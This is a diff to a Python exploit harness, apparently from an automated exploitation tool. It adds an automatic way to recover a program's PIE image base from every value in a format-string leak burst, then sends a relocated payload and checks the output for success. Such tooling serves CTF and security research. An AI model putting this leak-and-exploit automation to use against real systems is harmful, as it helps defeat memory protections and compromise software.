@@ -28,14 +28,19 @@ def _kill(p):
             pass
 
 
-def leak_and_exploit(exe, base_argv, *, leak_regex: str, leak_base_offset: int,
+def leak_and_exploit(exe, base_argv, *, leak_regex: str, leak_base_offset=None,
                      payload_for_base, success_regex: str, timeout: float = 8.0,
-                     mem_mb: int = 2048) -> dict:
+                     mem_mb: int = 2048, base_from_leaks=None) -> dict:
     """Interactive single-process leak → relocate → exploit over stdin/stdout.
 
-    `leak_base_offset` is the static offset (from the image base) of whatever address the
-    target leaks, so base = leaked - leak_base_offset. `payload_for_base(base)->bytes` builds
-    the relocated payload. Success = `success_regex` appears in the post-payload output.
+    Two ways to turn the leak into an image base:
+      - `leak_base_offset` (analyst-gated): the static offset of the single symbol the target
+        leaks, so base = leaked - leak_base_offset.
+      - `base_from_leaks` (automatic): a callback given EVERY hex value in the leak burst that
+        returns the recovered base (e.g. `exploit.recover_pie_base` bound to the target bytes),
+        so the analyst need not say which symbol is leaked.
+    `payload_for_base(base)->bytes` builds the relocated payload. Success = `success_regex`
+    appears in the post-payload output.
     """
     rx = re.compile(leak_regex.encode("latin-1"))
     ok = re.compile(success_regex.encode("latin-1"))
@@ -53,9 +58,20 @@ def leak_and_exploit(exe, base_argv, *, leak_regex: str, leak_base_offset: int,
     except Exception as e:
         return {"ok": False, "reason": f"spawn failed: {e!r}"}
 
+    def _vals(b):
+        out = []
+        for m in rx.finditer(b):
+            grp = m.group(1) if m.groups() else m.group(0)
+            try:
+                out.append(int(grp, 16))
+            except ValueError:
+                pass
+        return out
+
     deadline = time.time() + timeout
     buf = b""
     leaked = None
+    last_data = time.time()
     try:
         while time.time() < deadline:
             r, _, _ = select.select([p.stdout], [], [], 0.2)
@@ -64,19 +80,33 @@ def leak_and_exploit(exe, base_argv, *, leak_regex: str, leak_base_offset: int,
                 if not chunk:
                     break
                 buf += chunk
-                m = rx.search(buf)
-                if m:
-                    grp = m.group(1) if m.groups() else m.group(0)
-                    leaked = int(grp, 16)
-                    break
+                last_data = time.time()
+                if rx.search(buf):
+                    leaked = True
+                    # a format-string leak prints its whole burst at once, then the target
+                    # blocks on our payload read (no EOF, no exit) -- so once something matched,
+                    # stop after a brief quiet gap rather than spinning to the deadline.
+                    if base_from_leaks is None:
+                        break
             elif p.poll() is not None:
                 break
-        if leaked is None:
+            elif leaked and (time.time() - last_data) > 0.3:
+                break                                    # burst captured; target now awaits input
+        vals = _vals(buf)
+        if not vals:
             _kill(p)
             return {"ok": False, "reason": "no leak matched before the target read input",
                     "output": buf[:400].decode("latin-1", "ignore")}
 
-        base = leaked - leak_base_offset
+        if base_from_leaks is not None:
+            base = base_from_leaks(vals)
+            if not base:
+                _kill(p)
+                return {"ok": False, "reason": "could not recover the image base from the leak",
+                        "leaked": vals[:8], "output": buf[:400].decode("latin-1", "ignore")}
+        else:
+            base = vals[0] - leak_base_offset
+        leaked = base + leak_base_offset if base_from_leaks is None else vals[0]
         payload = payload_for_base(base)
         sent_at = len(buf)          # only output AFTER this can confirm the RELOCATED payload worked
         try:
